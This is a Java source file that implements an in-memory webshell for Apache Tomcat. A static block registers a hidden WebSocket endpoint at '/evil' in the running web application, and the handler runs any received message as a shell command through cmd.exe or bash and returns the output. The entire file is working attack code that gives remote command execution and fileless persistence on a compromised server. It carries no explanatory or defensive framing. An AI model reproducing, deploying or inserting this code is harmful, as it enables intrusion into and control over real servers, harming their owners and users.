package com.memshell;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.io.InputStream;

public class WebSocks extends Endpoint implements MessageHandler.Whole<String>{
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
        ServerEndpointConfig build = ServerEndpointConfig.Builder.create(WebSocks.class, "/evil").build();
        WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
        try {
            attribute.addEndpoint(build);
        } catch (DeploymentException e) {
            throw new RuntimeException(e);
        }
    }
    private Session session;

    public void onMessage(String message) {
        try {
            boolean iswin = System.getProperty("os.name").toLowerCase().startsWith("windows");
            Process exec;
            if (iswin) {
                exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", message});
            } else {
                exec = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", message});
            }

            InputStream ips = exec.getInputStream();
            StringBuilder sb = new StringBuilder();

            int i;
            while((i = ips.read()) != -1) {
                sb.append((char)i);
            }

            ips.close();
            exec.waitFor();
            this.session.getBasicRemote().sendText(sb.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onOpen(Session session, EndpointConfig config) {
        this.session = session;
        this.session.addMessageHandler(this);
    }
}
